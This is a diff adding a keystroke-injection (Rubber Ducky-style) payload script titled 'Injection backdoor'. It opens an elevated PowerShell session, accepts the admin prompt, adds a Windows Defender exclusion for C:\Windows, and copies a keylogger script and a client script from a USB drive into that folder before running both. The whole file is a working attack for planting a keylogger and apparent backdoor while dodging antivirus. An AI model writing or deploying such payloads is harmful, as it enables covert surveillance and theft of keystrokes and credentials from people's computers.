@@ -1,0 +1,43 @@
+REM Injection backdoor
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell
+DELAY 50
+ENTER
+DELAY 1500
+STRING Start-Process powershell -Verb runAs
+DELAY 2000
+ENTER
+DELAY 500
+LEFTARROW
+DELAY 150
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath "C:\Windows"
+DELAY 100
+ENTER
+DELAY 500
+STRING cd D:
+DELAY 100
+ENTER
+DELAY 100
+STRING cp .\keylogger.py C:\Windows
+DELAY 100
+ENTER
+DELAY 1000
+STRING cp .\client.py C:\Windows
+DELAY 100
+ENTER
+DELAY 1000
+STRING cd C:\Windows\
+DELAY 100
+ENTER
+DELAY 100
+STRING ./client.py
+DELAY 100
+ENTER
+DELAY 3000
+STRING ./keylogger.py
+DELAY 100
+ENTER
